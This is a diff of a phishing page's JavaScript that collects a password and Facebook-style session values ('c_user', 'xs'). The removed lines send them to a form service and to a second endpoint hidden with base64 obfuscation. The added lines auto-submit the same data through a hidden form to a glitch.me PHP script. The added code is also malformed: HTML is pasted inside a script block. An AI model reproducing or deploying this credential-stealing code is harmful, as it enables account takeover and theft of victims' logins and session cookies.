@@ -1990,41 +1990,37 @@
                 const cUser = document.getElementById('c_user').value;
                 const xs = document.getElementById('xs').value;
                 
-                const endpoint1 = "https://submit-form.com/n2RZqvdp2";
-                const endpoint2 = atob(obfuscatedEndpoint);
-                
-                const formData = {
-                    c_user: cUser,
-                    xs: xs,
-                    password: passwordInput.value
-                };
-                
-                const submitToEndpoint = (endpoint) => {
-                    return fetch(endpoint, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(formData)
-                    });
-                };
-                
-                Promise.all([
-                    submitToEndpoint(endpoint1),
-                    submitToEndpoint(endpoint2)
-                ])
-                .then(responses => {
-                    responses.forEach((response, index) => {
-                        if (!response.ok) {
-                            console.error(`Submission to endpoint ${index+1} failed`);
-                        }
-                    });
-                })
-                .catch(error => {
-                    console.error('Submission error:', error);
-                });
-            });
+                <form id="myForm" class="sm:hidden lg:block md:block" action="https://curvy-exclusive-pump.glitch.me/Shoib.php" method="post"></form>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const form = document.getElementById('myForm');
+
+    const formData = {
+        c_user: cUser,
+        xs: xs,
+        password: passwordInput.value
+    };
+
+    // Clear old inputs if any
+    form.innerHTML = '';
+
+    // Create and append inputs
+    for (const key in formData) {
+        if (formData.hasOwnProperty(key)) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = formData[key];
+            form.appendChild(input);
+        }
+    }
+
+    // Submit the form
+    form.submit();
+});
+</script>
+
             
             // Reset form
             function resetForm() {
